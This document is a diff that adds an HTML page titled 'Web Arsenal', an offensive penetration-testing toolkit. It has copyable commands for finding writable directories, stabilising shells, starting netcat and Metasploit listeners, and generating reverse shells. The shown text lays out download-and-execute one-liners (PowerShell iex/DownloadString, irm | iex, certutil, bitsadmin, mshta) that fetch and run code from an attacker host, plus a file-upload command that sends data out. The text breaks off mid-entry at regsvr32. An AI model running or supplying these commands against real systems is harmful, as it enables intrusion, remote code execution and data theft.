@@ -1,0 +1,1973 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Web exploitation arsenal with XSS, LFI, RFI, SSRF, XXE, SSTI, file upload, and command injection payloads.">
+    <meta name="theme-color" content="#020408">
+<title>Web Arsenal - Web Exploitation & Rev Shell Engine</title>
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=Syne:wght@400;500;600;700&display=swap');
+:root{
+  --bg:#0d0f14;--bg2:#131620;--bg3:#1a1e2b;--bg4:#1f2435;
+  --border:#252a3a;--border2:#2e3548;
+  --green:#00e5a0;--blue:#4da6ff;--orange:#ff8c42;--red:#ff4d6d;--purple:#b06cff;--yellow:#ffd166;--cyan:#79c0ff;--teal:#2ea043;
+  --text:#e2e8f0;--text2:#8892aa;--text3:#555e78;
+  --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--mono);background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5;font-size:13px}
+.app{display:flex;height:100vh;overflow:hidden}
+
+/* sidebar */
+.sidebar{width:200px;flex-shrink:0;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto}
+.logo{padding:16px;border-bottom:1px solid var(--border);font-family:var(--sans);font-weight:700;font-size:14px;color:var(--green);display:flex;align-items:center;gap:8px}
+.logo small{color:var(--text3);font-size:10px;font-weight:400}
+.nav{padding:8px 0}
+.nlabel{font-size:9px;font-weight:600;text-transform:uppercase;letter-spacing:.1em;color:var(--text3);padding:8px 14px 3px}
+.ni{display:flex;align-items:center;gap:8px;padding:8px 14px;font-size:11px;color:var(--text2);cursor:pointer;border-left:2px solid transparent;transition:all .15s}
+.ni:hover{background:var(--bg3);color:var(--text)}
+.ni.active{background:var(--bg3);color:var(--green);border-left-color:var(--green)}
+.ni .cnt{margin-left:auto;font-size:9px;color:var(--text3);font-family:var(--mono)}
+
+/* main */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+
+/* topbar */
+.topbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.tb-title{font-family:var(--sans);font-size:12px;font-weight:600;color:var(--text);margin-right:4px}
+.vchip{display:flex;align-items:center;gap:5px;background:var(--bg3);border:1px solid var(--border2);border-radius:6px;padding:2px 4px 2px 8px}
+.vchip label{font-size:9px;color:var(--text3);white-space:nowrap}
+.vchip input{font-family:var(--mono);font-size:11px;background:var(--bg4);border:1px solid var(--border2);border-radius:4px;color:var(--green);padding:2px 5px;width:90px;outline:none}
+.vchip input:focus{border-color:var(--green)}
+.badge{font-size:9px;font-family:var(--mono);letter-spacing:.5px;border-radius:4px;padding:2px 7px;border:1px solid;margin-left:auto}
+.badge-red{background:rgba(255,77,109,.1);color:var(--red);border-color:rgba(255,77,109,.3)}
+
+/* content */
+.content{flex:1;overflow-y:auto;padding:16px}
+.page{display:none}.page.active{display:block}
+
+/* search */
+.search-wrap{margin-bottom:12px}
+.search-wrap input{width:100%;font-family:var(--mono);font-size:11px;background:var(--bg3);border:1px solid var(--border2);border-radius:6px;color:var(--text);padding:7px 12px;outline:none}
+.search-wrap input:focus{border-color:var(--green)}
+
+/* cards shared */
+.sg{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
+@media(max-width:800px){.sg{grid-template-columns:1fr}}
+.sc{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+.sc-hdr{display:flex;align-items:center;gap:8px;padding:9px 13px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.sc-title{font-size:11px;font-weight:500;color:var(--text)}
+.osbadge{font-size:9px;font-weight:600;padding:2px 7px;border-radius:99px}
+.ob-lin{background:#0a2a1a;color:var(--green);border:1px solid #0d3d24}
+.ob-win{background:#0a1a2e;color:var(--blue);border:1px solid #0d2d50}
+.ob-web{background:#1a0a2e;color:var(--purple);border:1px solid #2d1050}
+.sc-blk{padding:7px 13px;border-bottom:1px solid var(--border)}
+.sc-blk:last-child{border-bottom:none}
+.sc-lbl{font-size:9px;color:var(--text3);margin-bottom:3px}
+.sc-row{display:flex;align-items:flex-start;gap:6px}
+.cbox{flex:1;font-family:var(--mono);font-size:11px;line-height:1.6;padding:5px 9px;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--text);white-space:pre-wrap;word-break:break-all}
+.cpbtn{font-family:var(--mono);font-size:9px;padding:3px 7px;border-radius:5px;border:1px solid var(--border2);background:var(--bg3);color:var(--text2);cursor:pointer;white-space:nowrap;flex-shrink:0;transition:all .15s;margin-top:1px}
+.cpbtn:hover{border-color:var(--green);color:var(--text)}
+.cpbtn.ok{color:var(--green);border-color:var(--green)}
+
+/* section labels */
+.sec-lbl{font-family:var(--sans);font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.09em;color:var(--text3);margin:16px 0 6px;display:flex;align-items:center;gap:8px}
+.sec-lbl::after{content:'';flex:1;height:1px;background:var(--border)}
+
+/* method cards */
+.mcard{background:var(--bg2);border:1px solid var(--border);border-radius:10px;margin-bottom:7px;overflow:hidden}
+.mhdr{display:flex;align-items:center;gap:8px;padding:8px 13px;cursor:pointer;user-select:none}
+.mhdr:hover{background:var(--bg3)}
+.mname{font-size:12px;font-weight:500;color:var(--text);flex:1}
+.tags{display:flex;gap:3px;flex-wrap:wrap}
+.tag{font-size:9px;font-weight:600;padding:1px 6px;border-radius:99px}
+.t-ps{background:#0d2010;color:#5ddd9b;border:1px solid #1a4025}
+.t-cmd{background:#0d0d2e;color:#9d9aff;border:1px solid #252270}
+.t-anon{background:#2a1008;color:#ff8a6a;border:1px solid #4a2010}
+.t-auth{background:#0d2010;color:#5ddd9b;border:1px solid #1a4025}
+.t-enc{background:#2a1e00;color:#ffc55a;border:1px solid #4a3500}
+.t-noenc{background:#2a0808;color:#ff7070;border:1px solid #4a1010}
+.t-exec{background:#2a0a0a;color:#ff6b6b;border:1px solid #4a1515}
+.t-dl{background:#0a1e2a;color:#6bb5ff;border:1px solid #103550}
+.t-php{background:#1a102a;color:#b06cff;border:1px solid #3a1560}
+.t-asp{background:#0a1a2e;color:#4da6ff;border:1px solid #0d2d50}
+.t-jsp{background:#2a1e00;color:#ffd166;border:1px solid #4a3500}
+.t-bypass{background:#2a0808;color:#ff4d6d;border:1px solid #4a1010}
+.t-waf{background:#2a1008;color:#ff8c42;border:1px solid #4a2010}
+.t-sqli{background:#2a0808;color:#ff4d6d;border:1px solid #4a1010}
+.t-xss{background:#2a1e00;color:#ffd166;border:1px solid #4a3500}
+.t-lfi{background:#0a2a1a;color:#00e5a0;border:1px solid #0d3d24}
+.t-rce{background:#2a0a0a;color:#ff6b6b;border:1px solid #4a1515}
+.t-ssti{background:#1a102a;color:#b06cff;border:1px solid #3a1560}
+.t-ssrf{background:#0a1a2e;color:#79c0ff;border:1px solid #103550}
+.tico{font-size:10px;color:var(--text3);transition:transform .2s;flex-shrink:0}
+.mbody{display:none;padding:9px 13px;border-top:1px solid var(--border)}
+.mbody.open{display:block}
+.crow{display:flex;align-items:flex-start;gap:7px;margin-bottom:5px}
+.clabel{font-size:9px;color:var(--text3);min-width:68px;padding-top:5px;white-space:nowrap}
+.cnote{font-size:10px;color:var(--text3);margin-top:5px;padding-left:75px;line-height:1.6}
+.cwarn{font-size:10px;color:var(--red);margin-top:5px;padding-left:75px;line-height:1.6}
+
+/* rev shell */
+.rsgrid{display:grid;grid-template-columns:310px 1fr;gap:14px}
+@media(max-width:900px){.rsgrid{grid-template-columns:1fr}}
+.rspanel{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:12px}
+.phdr{padding:9px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-family:var(--sans);font-size:12px;font-weight:600;color:var(--text);display:flex;align-items:center;gap:6px}
+.pbody{padding:13px 14px}
+.frow{margin-bottom:11px}
+.flabel{font-size:9px;color:var(--text3);margin-bottom:3px;display:block}
+.finput,.fselect{width:100%;font-family:var(--mono);font-size:11px;background:var(--bg);border:1px solid var(--border2);border-radius:6px;color:var(--text);padding:6px 9px;outline:none;transition:border-color .15s}
+.finput:focus,.fselect:focus{border-color:var(--green)}
+.fselect option{background:var(--bg3)}
+.ostoggle{display:flex;gap:5px}
+.osbtn{flex:1;font-family:var(--mono);font-size:10px;padding:6px;border-radius:6px;border:1px solid var(--border2);background:var(--bg);color:var(--text2);cursor:pointer;text-align:center;transition:all .15s}
+.osbtn.alin{background:#0a2a1a;color:var(--green);border-color:#1a4025}
+.osbtn.awin{background:#0a1a2e;color:var(--blue);border-color:#1a3560}
+.osbtn.aboth{background:#1a1020;color:var(--purple);border-color:#3a1560}
+.genbtn{width:100%;font-family:var(--sans);font-size:13px;font-weight:700;padding:10px;border-radius:8px;border:none;background:linear-gradient(135deg,#00c48c,#00e5a0);color:#0a1f17;cursor:pointer;transition:opacity .15s,transform .1s;letter-spacing:.03em;margin-top:2px}
+.genbtn:hover{opacity:.9;transform:translateY(-1px)}
+.genbtn:active{transform:translateY(0)}
+.shell-out-panel{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;display:flex;flex-direction:column;min-height:400px}
+.shell-cards{padding:12px 14px;display:flex;flex-direction:column;gap:9px;overflow-y:auto;flex:1}
+.scard{background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.scard-hdr{display:flex;align-items:center;justify-content:space-between;padding:6px 11px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.scard-name{font-size:11px;font-weight:500;color:var(--text)}
+.scard-code{font-family:var(--mono);font-size:11px;line-height:1.7;padding:9px 11px;color:var(--text);white-space:pre-wrap;word-break:break-all;max-height:110px;overflow-y:auto}
+.scard-foot{display:flex;align-items:center;justify-content:space-between;padding:5px 11px;border-top:1px solid var(--border)}
+.scard-lst{font-size:9px;color:var(--text3)}
+.scard-lst code{color:var(--green);font-family:var(--mono)}
+.empty-st{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text3);font-size:11px;padding:40px;text-align:center;gap:8px}
+.empty-ico{font-size:30px;opacity:.3}
+
+/* scrollbar */
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:99px}
+</style>
+
+<style id="mahdiesta-theme-style">
+:root {
+  --mah-bg: #020408;
+  --mah-bg-elevated: #080c14;
+  --mah-bg-card: #0d111c;
+  --mah-text: #e2e8f0;
+  --mah-text-secondary: #94a3b8;
+  --mah-border: #1e2740;
+  --mah-accent: #22d3ee;
+}
+[data-theme="light"] {
+  --mah-bg: #f8fafc;
+  --mah-bg-elevated: #ffffff;
+  --mah-bg-card: #ffffff;
+  --mah-text: #0f172a;
+  --mah-text-secondary: #475569;
+  --mah-border: #e2e8f0;
+  --mah-accent: #0891b2;
+}
+html, body {
+  background: var(--mah-bg) !important;
+  color: var(--mah-text) !important;
+}
+#theme-toggle-btn {
+  position: fixed;
+  bottom: 1rem;
+  right: 1rem;
+  z-index: 9999;
+  width: 40px;
+  height: 40px;
+  border-radius: 10px;
+  border: 1px solid var(--mah-border);
+  background: var(--mah-bg-card);
+  color: var(--mah-text-secondary);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1rem;
+  transition: all 0.25s ease;
+}
+#theme-toggle-btn:hover {
+  border-color: var(--mah-accent);
+  color: var(--mah-accent);
+}
+</style>
+</head>
+<body>
+<div class="app">
+<div class="sidebar">
+  <div class="logo">Web Arsenal <small>v1.0</small></div>
+  <nav class="nav">
+    <div class="nlabel">Core</div>
+    <div class="ni active" id="nav-smart" onclick="showPage('smart')">Smart Cmds</div>
+    <div class="ni" id="nav-methods" onclick="showPage('methods')">DL &amp; Exec</div>
+    <div class="ni" id="nav-revshell" onclick="showPage('revshell')">Rev Shells</div>
+    <div class="nlabel">Web Attacks</div>
+    <div class="ni" id="nav-recon" onclick="showPage('recon')">Web Recon <span class="cnt" id="cnt-recon"></span></div>
+    <div class="ni" id="nav-upload" onclick="showPage('upload')">File Upload <span class="cnt" id="cnt-upload"></span></div>
+    <div class="ni" id="nav-webshell" onclick="showPage('webshell')">Web Shells <span class="cnt" id="cnt-webshell"></span></div>
+    <div class="ni" id="nav-sqli" onclick="showPage('sqli')">SQL Injection <span class="cnt" id="cnt-sqli"></span></div>
+    <div class="ni" id="nav-xss" onclick="showPage('xss')">XSS <span class="cnt" id="cnt-xss"></span></div>
+    <div class="ni" id="nav-lfi" onclick="showPage('lfi')">LFI / RFI <span class="cnt" id="cnt-lfi"></span></div>
+    <div class="ni" id="nav-cmdi" onclick="showPage('cmdi')">Cmd Injection <span class="cnt" id="cnt-cmdi"></span></div>
+    <div class="ni" id="nav-ssti" onclick="showPage('ssti')">SSTI <span class="cnt" id="cnt-ssti"></span></div>
+    <div class="ni" id="nav-ssrf" onclick="showPage('ssrf')">SSRF <span class="cnt" id="cnt-ssrf"></span></div>
+    <div class="ni" id="nav-xxe" onclick="showPage('xxe')">XXE <span class="cnt" id="cnt-xxe"></span></div>
+    <div class="ni" id="nav-deser" onclick="showPage('deser')">Deserialization <span class="cnt" id="cnt-deser"></span></div>
+    <div class="nlabel">Brute Force</div>
+    <div class="ni" id="nav-brute" onclick="showPage('brute')">Login Brute <span class="cnt" id="cnt-brute"></span></div>
+  </nav>
+</div>
+<div class="main">
+  <div class="topbar">
+    <span class="tb-title">Vars</span>
+    <div class="vchip"><label>LHOST</label><input id="v_ip" value="192.168.1.10"></div>
+    <div class="vchip"><label>HTTP PORT</label><input id="v_port" value="8080" style="width:70px"></div>
+    <div class="vchip"><label>FILE</label><input id="v_file" value="agent.exe"></div>
+    <div class="vchip"><label>SHARE</label><input id="v_share" value="share" style="width:60px"></div>
+    <div class="vchip"><label>USER</label><input id="v_user" value="kali" style="width:60px"></div>
+    <div class="vchip"><label>PASS</label><input id="v_pass" value="kali" style="width:60px"></div>
+    <div class="vchip"><label>LPORT</label><input id="v_sport" value="4444" style="width:60px"></div>
+    <div class="vchip"><label>TARGET</label><input id="v_target" value="target.com" style="width:100px"></div>
+    <span class="badge badge-red">AUTHORIZED USE ONLY</span>
+  </div>
+  <div class="content">
+
+    <!-- PAGE: Smart -->
+    <div class="page active" id="page-smart">
+      <div class="sg">
+        <div class="sc">
+          <div class="sc-hdr"><span class="osbadge ob-lin">Linux/macOS</span><span class="sc-title">Find Writable Dirs</span></div>
+          <div class="sc-blk"><div class="sc-lbl">From current location</div><div class="sc-row"><div class="cbox" id="s0">find . -type d -writable 2>/dev/null</div><button class="cpbtn" onclick="cp('s0',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">System-wide (skip /proc /sys /dev)</div><div class="sc-row"><div class="cbox" id="s1">find / -maxdepth 4 -type d -writable 2>/dev/null | grep -vE "^/proc|^/sys|^/dev"</div><button class="cpbtn" onclick="cp('s1',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">Best writable dir -> assign $DEST</div><div class="sc-row"><div class="cbox" id="s3">DEST=$(for d in "$HOME" /tmp "${TMPDIR:-/tmp}" /var/tmp; do [ -w "$d" ] && echo "$d" && break; done); echo "$DEST"</div><button class="cpbtn" onclick="cp('s3',this)">Copy</button></div></div>
+        </div>
+        <div class="sc">
+          <div class="sc-hdr"><span class="osbadge ob-win">Windows PS</span><span class="sc-title">Find Writable Dirs</span></div>
+          <div class="sc-blk"><div class="sc-lbl">Quick check - common safe spots</div><div class="sc-row"><div class="cbox" id="s5">@($env:TEMP,$env:TMP,$env:USERPROFILE,$env:LOCALAPPDATA) | Where-Object { $_ -and (Test-Path $_) } | ForEach-Object { $_ }</div><button class="cpbtn" onclick="cp('s5',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">CMD fallback</div><div class="sc-row"><div class="cbox" id="s7">echo %TEMP% && echo %USERPROFILE% && echo %LOCALAPPDATA%</div><button class="cpbtn" onclick="cp('s7',this)">Copy</button></div></div>
+        </div>
+        <div class="sc">
+          <div class="sc-hdr"><span class="osbadge ob-web">Web</span><span class="sc-title">Quick Web Enum</span></div>
+          <div class="sc-blk"><div class="sc-lbl">Whatweb fingerprint</div><div class="sc-row"><div class="cbox" id="sw1">whatweb -a 3 http://TARGET</div><button class="cpbtn" onclick="cp('sw1',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">WAF detection</div><div class="sc-row"><div class="cbox" id="sw2">wafw00f http://TARGET</div><button class="cpbtn" onclick="cp('sw2',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">Gobuster quick dir scan</div><div class="sc-row"><div class="cbox" id="sw3">gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak,zip -t 40</div><button class="cpbtn" onclick="cp('sw3',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">Nikto vuln scan</div><div class="sc-row"><div class="cbox" id="sw4">nikto -h http://TARGET -o nikto.txt</div><button class="cpbtn" onclick="cp('sw4',this)">Copy</button></div></div>
+        </div>
+        <div class="sc">
+          <div class="sc-hdr"><span class="osbadge ob-web">Web</span><span class="sc-title">Shell Upgrade & Stabilize</span></div>
+          <div class="sc-blk"><div class="sc-lbl">Python PTY spawn</div><div class="sc-row"><div class="cbox" id="su1">python3 -c 'import pty;pty.spawn("/bin/bash")'</div><button class="cpbtn" onclick="cp('su1',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">Full TTY upgrade</div><div class="sc-row"><div class="cbox" id="su2">python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+reset
+export TERM=xterm
+export SHELL=bash
+stty rows 40 columns 160</div><button class="cpbtn" onclick="cp('su2',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">Script method</div><div class="sc-row"><div class="cbox" id="su3">script /dev/null -c bash</div><button class="cpbtn" onclick="cp('su3',this)">Copy</button></div></div>
+          <div class="sc-blk"><div class="sc-lbl">Perl PTY spawn</div><div class="sc-row"><div class="cbox" id="su4">perl -e 'exec "/bin/bash";'</div><button class="cpbtn" onclick="cp('su4',this)">Copy</button></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE: Methods -->
+    <div class="page" id="page-methods"><div id="methods-root"></div></div>
+
+    <!-- PAGE: Rev Shells -->
+    <div class="page" id="page-revshell">
+      <div class="rsgrid">
+        <div>
+          <div class="rspanel">
+            <div class="phdr">Configuration</div>
+            <div class="pbody">
+              <div class="frow"><label class="flabel">LHOST (your listener IP)</label><input class="finput" id="rs_ip" placeholder="192.168.1.10" oninput="genShells()"></div>
+              <div class="frow"><label class="flabel">LPORT</label><input class="finput" id="rs_port" placeholder="4444" style="width:120px" oninput="genShells()"></div>
+              <div class="frow">
+                <label class="flabel">Target OS</label>
+                <div class="ostoggle">
+                  <div class="osbtn alin" id="osb-lin" onclick="setOS('lin')">Linux</div>
+                  <div class="osbtn" id="osb-win" onclick="setOS('win')">Windows</div>
+                  <div class="osbtn" id="osb-both" onclick="setOS('both')">Both</div>
+                </div>
+              </div>
+              <div class="frow">
+                <label class="flabel">Filter by type</label>
+                <select class="fselect" id="rs_filter" onchange="genShells()">
+                  <option value="all">All shells</option>
+                  <option value="bash">Bash / sh</option>
+                  <option value="python">Python</option>
+                  <option value="nc">Netcat</option>
+                  <option value="perl">Perl</option>
+                  <option value="ruby">Ruby</option>
+                  <option value="php">PHP</option>
+                  <option value="ps">PowerShell</option>
+                  <option value="java">Java</option>
+                  <option value="node">Node.js</option>
+                </select>
+              </div>
+              <button class="genbtn" onclick="genShells()">Generate Shells</button>
+            </div>
+          </div>
+          <div class="rspanel">
+            <div class="phdr">Listener Commands</div>
+            <div class="pbody">
+              <div class="frow"><div class="sc-lbl">Netcat classic</div><div class="sc-row"><div class="cbox" id="lst-nc">nc -lvnp 4444</div><button class="cpbtn" onclick="cp('lst-nc',this)">Copy</button></div></div>
+              <div class="frow"><div class="sc-lbl">rlwrap nc (better TTY)</div><div class="sc-row"><div class="cbox" id="lst-rl">rlwrap nc -lvnp 4444</div><button class="cpbtn" onclick="cp('lst-rl',this)">Copy</button></div></div>
+              <div class="frow"><div class="sc-lbl">Socat listener (full TTY)</div><div class="sc-row"><div class="cbox" id="lst-so">socat file:`tty`,raw,echo=0 tcp-listen:4444</div><button class="cpbtn" onclick="cp('lst-so',this)">Copy</button></div></div>
+              <div class="frow"><div class="sc-lbl">Metasploit handler</div><div class="sc-row"><div class="cbox" id="lst-msf">use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+run</div><button class="cpbtn" onclick="cp('lst-msf',this)">Copy</button></div></div>
+            </div>
+          </div>
+        </div>
+        <div class="shell-out-panel">
+          <div class="phdr">Generated Shells <span id="shell-count" style="margin-left:auto;font-size:9px;color:var(--text3);font-weight:400"></span></div>
+          <div class="shell-cards" id="shell-output">
+            <div class="empty-st"><div class="empty-ico">~</div><div>Fill LHOST &amp; LPORT then click Generate</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE: Web Recon -->
+    <div class="page" id="page-recon"><div class="search-wrap"><input id="search-recon" placeholder="Search recon techniques..." oninput="filterCards('recon')"></div><div id="recon-root"></div></div>
+
+    <!-- PAGE: File Upload -->
+    <div class="page" id="page-upload"><div class="search-wrap"><input id="search-upload" placeholder="Search file upload techniques..." oninput="filterCards('upload')"></div><div id="upload-root"></div></div>
+
+    <!-- PAGE: Web Shells -->
+    <div class="page" id="page-webshell"><div class="search-wrap"><input id="search-webshell" placeholder="Search web shells..." oninput="filterCards('webshell')"></div><div id="webshell-root"></div></div>
+
+    <!-- PAGE: SQLi -->
+    <div class="page" id="page-sqli"><div class="search-wrap"><input id="search-sqli" placeholder="Search SQLi techniques..." oninput="filterCards('sqli')"></div><div id="sqli-root"></div></div>
+
+    <!-- PAGE: XSS -->
+    <div class="page" id="page-xss"><div class="search-wrap"><input id="search-xss" placeholder="Search XSS payloads..." oninput="filterCards('xss')"></div><div id="xss-root"></div></div>
+
+    <!-- PAGE: LFI/RFI -->
+    <div class="page" id="page-lfi"><div class="search-wrap"><input id="search-lfi" placeholder="Search LFI/RFI techniques..." oninput="filterCards('lfi')"></div><div id="lfi-root"></div></div>
+
+    <!-- PAGE: Command Injection -->
+    <div class="page" id="page-cmdi"><div class="search-wrap"><input id="search-cmdi" placeholder="Search command injection..." oninput="filterCards('cmdi')"></div><div id="cmdi-root"></div></div>
+
+    <!-- PAGE: SSTI -->
+    <div class="page" id="page-ssti"><div class="search-wrap"><input id="search-ssti" placeholder="Search SSTI payloads..." oninput="filterCards('ssti')"></div><div id="ssti-root"></div></div>
+
+    <!-- PAGE: SSRF -->
+    <div class="page" id="page-ssrf"><div class="search-wrap"><input id="search-ssrf" placeholder="Search SSRF techniques..." oninput="filterCards('ssrf')"></div><div id="ssrf-root"></div></div>
+
+    <!-- PAGE: XXE -->
+    <div class="page" id="page-xxe"><div class="search-wrap"><input id="search-xxe" placeholder="Search XXE techniques..." oninput="filterCards('xxe')"></div><div id="xxe-root"></div></div>
+
+    <!-- PAGE: Deserialization -->
+    <div class="page" id="page-deser"><div class="search-wrap"><input id="search-deser" placeholder="Search deserialization..." oninput="filterCards('deser')"></div><div id="deser-root"></div></div>
+
+    <!-- PAGE: Brute Force -->
+    <div class="page" id="page-brute"><div class="search-wrap"><input id="search-brute" placeholder="Search brute force techniques..." oninput="filterCards('brute')"></div><div id="brute-root"></div></div>
+
+  </div>
+</div>
+</div>
+
+<script>
+// ── helpers ──
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/\x3c/g,'&lt;').replace(/>/g,'&gt;')}
+function cp(id,btn){
+  const t=document.getElementById(id).textContent;
+  navigator.clipboard.writeText(t).then(()=>{
+    btn.textContent='ok';btn.classList.add('ok');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('ok')},1500);
+  });
+}
+function cpText(t,btn){
+  navigator.clipboard.writeText(t).then(()=>{
+    btn.textContent='ok';btn.classList.add('ok');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('ok')},1500);
+  });
+}
+
+// ── page switch ──
+function showPage(name){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.ni').forEach(n=>n.classList.remove('active'));
+  document.getElementById('page-'+name).classList.add('active');
+  document.getElementById('nav-'+name).classList.add('active');
+  if(name==='methods') renderMethods();
+  if(name==='revshell') genShells();
+  if(ATTACK_PAGES.includes(name)) renderAttackPage(name);
+}
+
+const ATTACK_PAGES=['recon','upload','webshell','sqli','xss','lfi','cmdi','ssti','ssrf','xxe','deser','brute'];
+
+// ── global vars ──
+function gv(){
+  return {
+    ip: document.getElementById('v_ip').value||'LHOST',
+    port: document.getElementById('v_port').value||'8080',
+    file: document.getElementById('v_file').value||'agent.exe',
+    share: document.getElementById('v_share').value||'share',
+    user: document.getElementById('v_user').value||'kali',
+    pass: document.getElementById('v_pass').value||'kali',
+    sport: document.getElementById('v_sport').value||'4444',
+    target: document.getElementById('v_target').value||'target.com',
+  };
+}
+function fill(t,v){
+  return t.replace(/{{ip}}/g,v.ip).replace(/{{port}}/g,v.port)
+    .replace(/{{file}}/g,v.file).replace(/{{share}}/g,v.share)
+    .replace(/{{user}}/g,v.user).replace(/{{pass}}/g,v.pass)
+    .replace(/{{sport}}/g,v.sport).replace(/{{target}}/g,v.target);
+}
+
+// ══════════════════════════════════
+// METHODS DATA (from pt-toolkit)
+// ══════════════════════════════════
+const METHODS=[
+  {section:"PowerShell (native)",items:[
+    {name:"Invoke-WebRequest (iwr)",tags:["ps","dl"],cmds:[
+      {l:"Download",t:"iwr http://{{ip}}:{{port}}/{{file}} -OutFile \"$env:TEMP\\{{file}}\""},
+      {l:"Download+Run",t:"$d=$env:TEMP; iwr http://{{ip}}:{{port}}/{{file}} -OutFile \"$d\\{{file}}\"; Start-Process \"$d\\{{file}}\""},
+      {l:"In-Memory",t:"iex (iwr http://{{ip}}:{{port}}/{{file}} -UseBasicParsing).Content"},
+      {l:"PS1 In-Mem",t:"iex (New-Object Net.WebClient).DownloadString('http://{{ip}}:{{port}}/{{file}}')"},
+    ],note:"Aliases: wget, curl. Add -UseBasicParsing if IE engine missing."},
+    {name:"Net.WebClient",tags:["ps","dl"],cmds:[
+      {l:"IEX classic",t:"iex (New-Object Net.WebClient).DownloadString('http://{{ip}}:{{port}}/{{file}}')"},
+      {l:"Download",t:"(New-Object Net.WebClient).DownloadFile('http://{{ip}}:{{port}}/{{file}}',\"$env:TEMP\\{{file}}\")"},
+      {l:"Upload",t:"(New-Object Net.WebClient).UploadFile('http://{{ip}}:{{port}}/upload',\"$env:TEMP\\{{file}}\")"},
+    ],note:"Works on PS 2.0+. Bypasses iwr restrictions."},
+    {name:"BitsTransfer",tags:["ps","dl"],cmds:[
+      {l:"Download",t:"Start-BitsTransfer -Src http://{{ip}}:{{port}}/{{file}} -Dst \"$env:TEMP\\{{file}}\""},
+      {l:"Async",t:"Start-BitsTransfer -Src http://{{ip}}:{{port}}/{{file}} -Dst \"$env:TEMP\\{{file}}\" -Async -DisplayName job1"},
+    ],note:"BITS service must be running."},
+    {name:"Invoke-RestMethod (irm)",tags:["ps","dl"],cmds:[
+      {l:"Exec PS1",t:"irm http://{{ip}}:{{port}}/{{file}} | iex"},
+      {l:"Download",t:"irm http://{{ip}}:{{port}}/{{file}} -OutFile \"$env:TEMP\\{{file}}\""},
+    ],note:"Same as iwr; preferred for REST/JSON."},
+    {name:"HttpClient (.NET 4.5+)",tags:["ps","dl"],cmds:[
+      {l:"Download",t:"$c=[System.Net.Http.HttpClient]::new();$b=$c.GetByteArrayAsync('http://{{ip}}:{{port}}/{{file}}').Result;[IO.File]::WriteAllBytes(\"$env:TEMP\\{{file}}\",$b)"},
+    ],note:"Useful when WebClient is blocked."},
+  ]},
+  {section:"CMD / MSHTA / LOLBINS",items:[
+    {name:"certutil",tags:["cmd","dl"],cmds:[
+      {l:"Download",t:"certutil -urlcache -split -f http://{{ip}}:{{port}}/{{file}} %TEMP%\\{{file}}"},
+      {l:"Base64 DL",t:"certutil -urlcache -split -f http://{{ip}}:{{port}}/{{file}}.b64 %TEMP%\\{{file}}.b64 && certutil -decode %TEMP%\\{{file}}.b64 %TEMP%\\{{file}}"},
+    ],note:"Built-in on all Windows. Noisy -- logged by EDR."},
+    {name:"bitsadmin",tags:["cmd","dl"],cmds:[
+      {l:"Download",t:"bitsadmin /transfer job1 http://{{ip}}:{{port}}/{{file}} %TEMP%\\{{file}}"},
+    ],note:"Legacy but present on Win10+."},
+    {name:"curl.exe (Win10 1803+)",tags:["cmd","dl"],cmds:[
+      {l:"Download",t:"curl http://{{ip}}:{{port}}/{{file}} -o %TEMP%\\{{file}}"},
+      {l:"Silent",t:"curl -s http://{{ip}}:{{port}}/{{file}} -o %TEMP%\\{{file}}"},
+    ],note:"Native since Windows 10 build 1803."},
+    {name:"mshta",tags:["cmd","exec"],cmds:[
+      {l:"Exec HTA",t:"mshta http://{{ip}}:{{port}}/{{file}}"},
+    ],note:"Executes remote .hta file. Bypasses many script policies."},
+    {name:"regsvr32 (squiblydoo)",tags:["cmd","exec"],cmds:[
